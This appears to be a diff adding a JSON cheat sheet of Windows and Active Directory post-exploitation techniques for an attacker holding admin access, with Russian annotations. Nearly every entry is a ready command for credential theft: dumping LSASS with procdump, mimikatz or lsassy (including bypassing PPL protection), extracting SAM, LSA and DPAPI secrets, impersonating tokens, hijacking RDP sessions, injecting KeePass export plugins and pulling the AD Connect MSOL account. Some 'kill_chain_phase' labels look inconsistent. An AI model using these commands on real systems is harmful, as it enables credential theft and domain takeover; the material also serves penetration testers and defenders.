@@ -1,0 +1,362 @@
+[
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe",
+    "tool": "procdump.exe",
+    "req": "Local Admin / SYSTEM",
+    "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Создание дампа памяти процесса LSASS для последующего оффлайн-анализа.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe",
+    "tool": "mimikatz",
+    "req": "Local Admin / SYSTEM",
+    "command": "\"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"exit\"",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Прямое извлечение учетных данных и хешей из памяти LSASS через Mimikatz.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access (SMB)",
+    "command": "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Удаленное извлечение кредов из LSASS с использованием модуля lsassy в NetExec.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access (SMB)",
+    "command": "nxc smb <ip_range> -u <user> -p <password> --sam",
+    "profit": "NTLM (Local Accounts)",
+    "critical_note": "Удаленный дамп локальных хешей из SAM базы через SMB.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM",
+    "tool": "mimikatz",
+    "req": "Local Admin / SYSTEM",
+    "command": "\"privilege::debug\" \"lsadump::sam\" \"exit\"",
+    "profit": "NTLM (Local Accounts)",
+    "critical_note": "Локальное извлечение хешей из SAM через Mimikatz.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM",
+    "tool": "secretsdump.py",
+    "req": "Network Admin Access",
+    "command": "secretsdump.py <domain>/<user>:<password>@<ip>",
+    "profit": "NTLM / PassTheHash",
+    "critical_note": "Удаленный дамп секретов (SAM, LSA, NTDS) через скрипт Impacket.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM",
+    "tool": "reg.exe + secretsdump.py",
+    "req": "Local Admin",
+    "command": "reg save HKLM\\SAM <file>; reg save HKLM\\SYSTEM <file>",
+    "profit": "NTLM (Local Accounts)",
+    "critical_note": "Ручной экспорт веток реестра для оффлайн извлечения хешей (secretsdump -sam ...).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSA",
+    "tool": "mimikatz",
+    "req": "Local Admin / SYSTEM",
+    "command": "\"privilege::debug\" \"lsadump::lsa\" \"exit\"",
+    "profit": "MsCache 2 / User + Pass",
+    "critical_note": "Извлечение LSA Secrets (включая кешированные доменные креды) через Mimikatz.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from DPAPI",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access (SMB)",
+    "command": "nxc smb <ip_range> -u <user> -p <password> --dpapi [cookies] [nosystem]",
+    "profit": "User + Pass / Cookies",
+    "critical_note": "Массовый сбор DPAPI секретов (включая cookies) через NetExec.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from DPAPI",
+    "tool": "donpapi",
+    "req": "Network Admin Access",
+    "command": "donpapi <domain>/<user>:<password>@<target>",
+    "profit": "User + Pass / DPAPI blobs",
+    "critical_note": "Автоматизированное извлечение DPAPI секретов с удаленной машины.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "DPAPI (Get Masterkey)",
+    "tool": "mimikatz",
+    "req": "Local Admin / SYSTEM",
+    "command": "\"sekurlsa::dpapi\"",
+    "profit": "DPAPI Masterkey",
+    "critical_note": "Извлечение мастер-ключей DPAPI из памяти lsass для расшифровки секретов.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Impersonate",
+    "tool": "Metasploit (incognito)",
+    "req": "Meterpreter Session (System)",
+    "command": "use incognito; impersonate_token <domain>\\\\<user>",
+    "profit": "ACL / User Access",
+    "critical_note": "Имперсонация токена пользователя через модуль incognito в Metasploit.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Impersonate",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access (SMB)",
+    "command": "nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>",
+    "profit": "Code Execution as User",
+    "critical_note": "Выполнение команд от имени залогиненного пользователя через планировщик задач.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Impersonate with ADCS",
+    "tool": "masky",
+    "req": "Network Admin Access",
+    "command": "masky -d <domain> -u <user> (-p <password> || -k || -H <hash>) -ca <certificate authority> <ip>",
+    "profit": "NTLM / TGT",
+    "critical_note": "Получение PFX/NTLM хеша текущих пользователей сессии через злоупотребление ADCS.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Impersonate RDP Session",
+    "tool": "tscon.exe",
+    "req": "SYSTEM",
+    "command": "psexec.exe -s -i cmd -> query user -> tscon.exe <id> /dest:<session_name>",
+    "profit": "RDP Session Hijacking",
+    "critical_note": "Перехват активной RDP сессии пользователя без ввода пароля (RDP Hijacking).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract Keepass",
+    "tool": "KeePwn.py",
+    "req": "Network Admin Access",
+    "command": "python KeePwn.py plugin add -u '<user>' -p '<password>' -d '<domain>' -t <target> --plugin KeeFarceRebornPlugin.dll",
+    "profit": "User + Pass (Keepass DB)",
+    "critical_note": "Внедрение плагина для экспорта паролей из запущенного процесса Keepass.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Hybrid (Azure AD-Connect)",
+    "tool": "azuread_decrypt_msol_v2.ps1",
+    "req": "Local Admin on ADConnect",
+    "command": "Dump cleartext password of MSOL Account on ADConnect Server",
+    "profit": "DCSYNC / Azure Admin",
+    "critical_note": "Расшифровка пароля учетной записи MSOL на сервере AD Connect.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe (Bypass PPL)",
+    "tool": "PPLdump64.exe",
+    "req": "Local Admin / SYSTEM",
+    "command": "PPLdump64.exe <lsass.exe|lsass_pid> lsass.dmp",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Дамп памяти LSASS при включенной защите PPL (Protected Process Light) с использованием пользовательского эксплойта.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe (Driver)",
+    "tool": "mimikatz",
+    "req": "Local Admin (Driver Load)",
+    "command": "mimikatz \"!+\" \"!processprotect /process:lsass.exe /remove\" \"privilege::debug\" \"token::elevate\" \"sekurlsa::logonpasswords\" \"!processprotect /process:lsass.exe\" \"!-\"",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Снятие защиты процесса LSASS через загрузку драйвера mimidrv для последующего чтения памяти.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe",
+    "tool": "Metasploit (kiwi)",
+    "req": "Meterpreter Session",
+    "command": "msf> load kiwi creds_all",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Использование загружаемого модуля Kiwi (аналог Mimikatz) внутри сессии Meterpreter.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSASS.exe",
+    "tool": "lsassy",
+    "req": "Network Admin Access",
+    "command": "lsassy -d <domain> -u <user> -p <password> <ip>",
+    "profit": "User + Pass / NTLM",
+    "critical_note": "Удаленный дамп LSASS с использованием standalone Python-версии инструмента lsassy.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM",
+    "tool": "Metasploit (hashdump)",
+    "req": "Meterpreter Session (System)",
+    "command": "msf> hashdump",
+    "profit": "NTLM (Local Accounts)",
+    "critical_note": "Быстрое извлечение локальных хешей через модуль Meterpreter hashdump.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM/LSA",
+    "tool": "reg.py (Impacket)",
+    "req": "Network Admin Access (Backup Operator)",
+    "command": "reg.py <domain>/<user>:<password>@<ip> backup -o \\\\<smb_ip>\\share",
+    "profit": "Hive Files (SAM/SYSTEM/SECURITY)",
+    "critical_note": "Удаленное сохранение веток реестра через операцию Backup (требует прав Backup Operator).",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from SAM",
+    "tool": "regsecrets.py",
+    "req": "Network Admin Access",
+    "command": "regsecrets.py <domain>/<user>:<password>@<ip>",
+    "profit": "NTLM / LSA Secrets",
+    "critical_note": "Скрипт для извлечения секретов реестра (Registry Secrets) удаленно.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSA",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access (SMB)",
+    "command": "nxc smb <ip_range> -u <user> -p <password> --lsa",
+    "profit": "LSA Secrets",
+    "critical_note": "Автоматизированное извлечение LSA Secrets через SMB с помощью NetExec.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from LSA",
+    "tool": "reg.exe + secretsdump.py",
+    "req": "Local Admin",
+    "command": "reg save HKLM\\SECURITY <file>; reg save HKLM\\SYSTEM <file>",
+    "profit": "LSA Secrets (Offline)",
+    "critical_note": "Ручной дамп ветки SECURITY для последующего оффлайн извлечения кешированных секретов.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract credentials from DPAPI",
+    "tool": "dpapidump.py",
+    "req": "Network Admin Access",
+    "command": "dpapidump.py <domain>/<user>:<password>@<target>",
+    "profit": "DPAPI Secrets / Blobs",
+    "critical_note": "Удаленный дамп DPAPI блобов с использованием python-скрипта.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "DPAPI (Get Masterkey)",
+    "tool": "lsassy",
+    "req": "Network Admin Access",
+    "command": "lsassy -d <domain> -u <user> -p <password> <ip> -m rdrleakdiag -M masterkeys",
+    "profit": "DPAPI Masterkeys",
+    "critical_note": "Извлечение мастер-ключей из LSASS удаленно с помощью lsassy.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "DPAPI (Get Masterkey / Browser)",
+    "tool": "dploot.py",
+    "req": "Network Admin Access",
+    "command": "dploot.py browser -d <domain> -u <user> -p '<password>' <ip> -mkfile <masterkeys_file>",
+    "profit": "Browser Cookies / Passwords",
+    "critical_note": "Эксплуатация DPAPI для расшифровки данных браузеров (куки, пароли) через dploot.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "DPAPI (Triage)",
+    "tool": "SharpDPAPI.exe",
+    "req": "Local Admin / User execution",
+    "command": "SharpDPAPI.exe triage",
+    "profit": "DPAPI Blobs location",
+    "critical_note": "Поиск и каталогизация защищенных DPAPI данных на хосте (C#-инструмент).",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Crack Users Masterkey",
+    "tool": "DPAPImk2john.py",
+    "req": "Access to AppData files",
+    "command": "DPAPImk2john.py --preferred <preferred_file> -> DPAPImk2john.py -c domain -mk <masterkey> -S <sid>",
+    "profit": "DPAPI Masterkey (Cracked)",
+    "critical_note": "Подготовка мастер-ключей DPAPI для брутфорса/крекинга.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Impersonate (Recon)",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access",
+    "command": "nxc smb <ip> -u <localAdmin> -p <password> --loggedon-users",
+    "profit": "List of potential targets",
+    "critical_note": "Получение списка залогиненных пользователей для выбора цели имперсонации.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Impersonate",
+    "tool": "irs.exe",
+    "req": "Local Admin",
+    "command": "irs.exe list -> irs.exe exec -p <pid> -c <command>",
+    "profit": "Code Execution as User",
+    "critical_note": "Использование инструмента IRS для инъекции команд в процесс другого пользователя.",
+    "kill_chain_phase": "PRIVESC"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Find Users",
+    "tool": "smbmap.py",
+    "req": "Network Access",
+    "command": "smbmap.py --host-file ./computers.list -u <user> -p <password> -d <domain> -r 'C$\\Users' --dir-only",
+    "profit": "Usernames / Home Directories",
+    "critical_note": "Поиск домашних директорий пользователей через SMB для выявления активных юзеров на хостах.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Extract Keepass",
+    "tool": "KeePwn.py (Trigger)",
+    "req": "Network Admin Access",
+    "command": "python KeePwn.py trigger add -u '<user>' -p '<password>' -d '<domain>' -t <target>",
+    "profit": "User + Pass (Keepass DB)",
+    "critical_note": "Установка триггера в конфиг Keepass для экспорта паролей при следующем запуске.",
+    "kill_chain_phase": "RECON"
+  },
+  {
+    "condition": "Admin access",
+    "attack_type": "Hybrid (Azure AD-Connect)",
+    "tool": "nxc (NetExec)",
+    "req": "Network Admin Access",
+    "command": "nxc smb <ip> -u <user> -p <password> -M msol",
+    "profit": "DCSYNC / Azure Admin",
+    "critical_note": "Модуль NetExec для извлечения учетных данных MSOL с сервера AD Connect.",
+    "kill_chain_phase": "PRIVESC"
+  }
+]
